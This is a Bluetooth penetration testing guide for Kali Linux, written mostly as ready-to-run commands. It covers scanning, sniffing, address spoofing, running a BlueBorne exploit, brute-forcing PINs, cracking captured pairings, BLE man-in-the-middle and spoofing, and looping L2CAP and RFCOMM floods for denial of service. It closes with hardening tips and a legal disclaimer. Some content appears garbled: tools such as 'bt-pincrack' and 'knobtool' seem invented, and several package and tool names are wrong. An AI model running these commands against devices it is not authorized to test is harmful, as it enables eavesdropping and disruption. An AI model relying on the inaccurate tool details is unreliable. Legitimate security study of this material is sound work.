# **Bluetooth Penetration Testing Guide**
*Using Kali Linux*

## **1. Bluetooth Architecture & Attack Surface**

### **Protocol Stack:**
- **HCI (Host Controller Interface)** - Primary communication layer
- **L2CAP (Logical Link Control & Adaptation Protocol)** - Multiplexing layer
- **RFCOMM** - Serial port emulation (Bluetooth SPP)
- **SDP (Service Discovery Protocol)** - Finds available services
- **ATT/GATT** - Used in Bluetooth Low Energy (BLE)

### **Key Terms:**
- **BD_ADDR** - Bluetooth Device Address (like MAC)
- **Class of Device (CoD)** - Type of device
- **Pairing/Bonding** - Authentication process
- **PIN/Passkey** - Usually 0000 or 1234 by default

---

## **2. Kali Setup & Tools Installation**

### **Prerequisites:**
```bash
# Update Kali
sudo apt update && sudo apt upgrade -y

# Install essential packages
sudo apt install bluetooth bluez bluez-tools libbluetooth-dev \
libpcap-dev libusb-dev libcurl4-openssl-dev python3-pip \
git build-essential -y
```

### **Essential Tools:**
```bash
# Classic Bluetooth tools
sudo apt install bluelog hcxdumptool hcxtools btscanner \
blueranger bluez-hcidump ubertooth

# BLE tools
sudo apt install bluetoothctl hcitool gatttool bleah

# Additional tools from GitHub
# 1. Bettercap
sudo apt install bettercap

# 2. Bluetooth Arsenal (collection)
git clone https://github.com/ojasookert/CVE-2017-0785
git clone https://github.com/securing/Blueborne
git clone https://github.com/godinezj/BlueJeans

# 3. Crackle (BT encryption cracker)
git clone https://github.com/mikeryan/crackle
cd crackle && make && sudo make install

# 4. BTLEJuice (BLE MITM framework)
sudo npm install -g btlejuice

# 5. Gattacker
sudo npm install -g gattacker
```

---

## **3. Reconnaissance & Enumeration**

### **Scanning for Devices:**
```bash
# Enable Bluetooth
sudo hciconfig hci0 up
sudo systemctl start bluetooth

# Scan with hcitool (classic)
sudo hcitool scan
sudo hcitool scan --flush --class --info

# Enhanced scanning with bluetoothctl
sudo bluetoothctl
[bluetooth]# power on
[bluetooth]# scan on
[bluetooth]# devices
[bluetooth]# info <MAC_ADDRESS>

# Using btscanner (GUI)
sudo btscanner
```

### **BLE Scanning:**
```bash
# Scan BLE devices
sudo hcitool lescan
sudo hcitool lescan --duplicates --passive

# Using bleah
sudo python -m bleah -e

# Bettercap for comprehensive scanning
sudo bettercap -eval "net.probe on; ble.recon on; ble.show;"
```

### **Service Discovery:**
```bash
# Discover SDP services
sudo sdptool browse <MAC_ADDRESS>

# L2CAP scan
sudo l2ping <MAC_ADDRESS>

# RFCOMM channel scanning
for i in {1..30}; do
    sudo rfcomm connect /dev/rfcomm$i <MAC_ADDRESS> $i 2>&1 | grep -v "refused"
done
```

---

## **4. Attack Vectors & Exploitation**

### **A. Sniffing & Eavesdropping**
```bash
# Using hcidump
sudo hcidump -X

# Using Ubertooth (hardware required)
ubertooth-btle -f -c capture.pcap

# Using Bettercap
sudo bettercap -eval "set ble.sniff.verbose true; ble.sniff on"

# Using btmon (Bluetooth monitor)
sudo btmon -w capture.btsnoop
```

### **B. MAC Address Spoofing**
```bash
# Change BD_ADDR temporarily
sudo bdaddr -i hci0 <NEW_MAC>
sudo hciconfig hci0 reset

# Permanent change (some adapters)
echo "sudo bdaddr <NEW_MAC>" >> /etc/rc.local
```

### **C. BlueBorne Exploitation**
```bash
# Check for BlueBorne vulnerabilities
git clone https://github.com/ojasookert/CVE-2017-0785
cd CVE-2017-0785
python scanner.py <TARGET_MAC>

# Exploit
python exploit.py <TARGET_MAC>
```

### **D. Pairing Attacks**
```bash
# 1. Brute-force PIN
sudo bt-pincrack <MAC_ADDRESS>

# 2. Capture pairing handshake
# Use hcidump or Wireshark to capture pairing
# Then crack with crackle:
crackle -i capture.pcap -o decrypted.pcap
```

### **E. BLE Attacks**
```bash
# 1. GATT exploitation
gatttool -b <MAC_ADDRESS> --interactive
[  ][<MAC>]> connect
[CON][<MAC>]> characteristics
[CON][<MAC>]> char-read-hnd <handle>

# 2. BLE spoofing with Gattacker
# Setup
sudo gattacker
# In another terminal
sudo gattacker -a <VICTIM_MAC> -s <SERVICE_UUID>
```

### **F. Denial of Service**
```bash
# L2CAP flood
sudo l2ping -i hci0 -f <MAC_ADDRESS> -s 600

# RFCOMM DoS
for i in {1..100}; do
    timeout 1 sudo rfcomm connect /dev/rfcomm1 <MAC_ADDRESS> 1 &
done
```

---

## **5. Advanced Attacks**

### **1. Bluetooth Impersonation Attack (BIAS)**
```bash
# Requires specific tools
git clone https://github.com/francozappa/bias
cd bias
# Follow README for setup
```

### **2. KNOB Attack (Key Negotiation Of Bluetooth)**
```bash
# Check vulnerability
sudo knobtool <TARGET_MAC>

# Exploit to force weak encryption
# Requires specialized hardware/patched stack
```

### **3. BLE MITM with BTLEJuice**
```bash
# Setup proxy
sudo btlejuice-proxy
# In another terminal
sudo btlejuice -u <INTERFACE> -w

# Access web interface at http://localhost:8080
```

---

## **6. Practical Lab Setup**

### **Test Environment:**
```bash
# Create virtual test devices
# 1. Setup Bluetooth dongle
sudo hciconfig hci1 up
sudo hciconfig hci1 piscan

# 2. Create SPP service
sudo sdptool add SP

# 3. Create RFCOMM channel
sudo rfcomm listen /dev/rfcomm0 1
```

### **Capture & Analyze Traffic:**
```bash
# Capture with Wireshark
sudo wireshark -k -i bluetooth-mon0 &
# or
sudo tshark -i bluetooth-mon0 -w bt_capture.pcap

# Analyze with
sudo wireshark bt_capture.pcap
```

---

## **7. Defensive Countermeasures**

### **Detection:**
```bash
# Monitor with bluelog
sudo bluelog -i hci0 -n -v -o log.txt

# Intrusion detection
sudo blue_hydra -r
```

### **Hardening:**
1. Disable unnecessary Bluetooth services
2. Use non-default PIN codes (6+ digits)
3. Enable Secure Simple Pairing (SSP)
4. Regularly update firmware
5. Disable discoverability when not needed

---

## **8. Useful Scripts & Automation**

### **Automated Recon:**
```bash
#!/bin/bash
# bt_recon.sh
TARGET=$1

echo "[*] Starting Bluetooth recon on $TARGET"
echo "[*] Scanning with hcitool..."
sudo hcitool scan | grep -i $TARGET

echo "[*] Service discovery..."
sudo sdptool browse $TARGET 2>/dev/null | tee sdp_$TARGET.txt

echo "[*] L2CAP check..."
sudo l2ping -c 2 $TARGET

echo "[*] RFCOMM channels..."
for i in {1..30}; do
    timeout 1 sudo rfcomm connect /dev/rfcomm$i $TARGET $i 2>&1 | grep -E "connected|channel" &
done
wait
```

### **BLE Enumeration Script:**
```python
#!/usr/bin/env python3
# ble_enum.py
import subprocess
import re

def ble_scan():
    result = subprocess.run(['sudo', 'hcitool', 'lescan'], 
                          capture_output=True, text=True)
    devices = re.findall(r'([0-9A-F:]{17}) \((.*?)\)', result.stdout)
    return devices

for addr, name in ble_scan():
    print(f"[+] Found: {name} - {addr}")
    # Additional enumeration here
```

---

## **9. Hardware Recommendations**

1. **Bluetooth Adapters:**
   - CSR 4.0 (cheap, compatible)
   - Cambridge Silicon Radio (CSR) chipsets
   - Ubertooth One (specialized for security testing)

2. **BLE Development Boards:**
   - Nordic nRF52840 Dongle
   - Raspberry Pi with BLE
   - ESP32 development boards

---

## **10. Practice & Resources**

### **Practice Targets:**
- Old Bluetooth keyboards/mice
- IoT devices (smart locks, lights)
- Android/iOS devices (with permission)
- Bluetooth speakers/headsets

### **Learning Resources:**
1. **Books:**
   - "Bluetooth Security" by Christian Gehrmann
   - "IoT Penetration Testing Cookbook" by Aaron Guzman

2. **CTFs & Labs:**
   - HackTheBox Bluetooth challenges
   - VulnHub IoT machines
   - OWASP IoTGoat

3. **References:**
   - Bluetooth SIG specifications
   - NIST Bluetooth Security Guide
   - OWASP IoT Testing Guide

---

## **Important Legal Disclaimer:**
⚠️ **Only test devices you own or have explicit written permission to test.** Unauthorized Bluetooth testing may violate:
- Computer Fraud and Abuse Act (CFAA)
- Wiretap laws
- Local privacy regulations
- Company policies

**Always** use a Faraday cage or isolated lab for testing, and document all authorizations.

---

## **Next Steps:**
1. Start with basic reconnaissance on your own devices
2. Practice sniffing in controlled environment
3. Build a test lab with old Bluetooth devices
4. Study Bluetooth protocol specifications
5. Follow Bluetooth security CVEs and updates

This guide provides a foundation. Master each tool individually, understand the protocols, and always practice ethically. Bluetooth PT requires patience as connections can be unstable and tools may need specific hardware compatibility.

**Happy (ethical) hacking!**
